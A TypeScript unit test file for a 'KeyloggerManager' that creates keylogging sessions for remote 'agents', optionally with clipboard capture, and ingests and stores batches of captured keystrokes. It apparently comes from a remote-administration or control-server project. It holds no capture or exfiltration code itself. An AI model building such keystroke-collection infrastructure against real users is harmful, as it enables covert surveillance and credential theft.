import { beforeEach, describe, expect, it } from 'vitest';
import type { KeyloggerEventEnvelope } from '$lib/types/keylogger';
import { KeyloggerManager } from './keylogger';

describe('KeyloggerManager', () => {
	let manager: KeyloggerManager;

	beforeEach(() => {
		manager = new KeyloggerManager();
	});

	it('creates sessions with normalized configuration', () => {
		const session = manager.createSession('agent-1', {
			mode: 'offline',
			batchIntervalMs: 60_000,
			includeClipboard: true
		});

		expect(session.sessionId).toBeTruthy();
		expect(session.agentId).toBe('agent-1');
		expect(session.mode).toBe('offline');
		expect(session.config.bufferSize).toBeGreaterThan(0);

		const state = manager.getState('agent-1');
		expect(state.session?.active).toBe(true);
		expect(state.telemetry.totalEvents).toBe(0);
	});

	it('ingests keylogger telemetry batches', () => {
		const session = manager.createSession('agent-1', { mode: 'standard', cadenceMs: 100 });

		const envelope: KeyloggerEventEnvelope = {
			sessionId: session.sessionId,
			mode: 'standard',
			capturedAt: new Date().toISOString(),
			batchId: 'batch-1',
			events: [
				{
					sequence: 1,
					capturedAt: new Date().toISOString(),
					key: 'a',
					text: 'test'
				}
			],
			totalEvents: 1
		} satisfies KeyloggerEventEnvelope;

		const telemetry = manager.ingest('agent-1', envelope);
		expect(telemetry.totalEvents).toBe(1);
		expect(telemetry.batches).toHaveLength(1);
		expect(telemetry.batches[0].batchId).toBe('batch-1');

		const state = manager.getState('agent-1');
		expect(state.session?.totalEvents).toBe(1);
		expect(state.session?.lastCapturedAt).toBe(envelope.capturedAt);
	});

	it('marks sessions inactive when stopped', () => {
		const session = manager.createSession('agent-1', { mode: 'standard' });
		const stopped = manager.stopSession('agent-1', session.sessionId);
		expect(stopped?.active).toBe(false);
	});
});
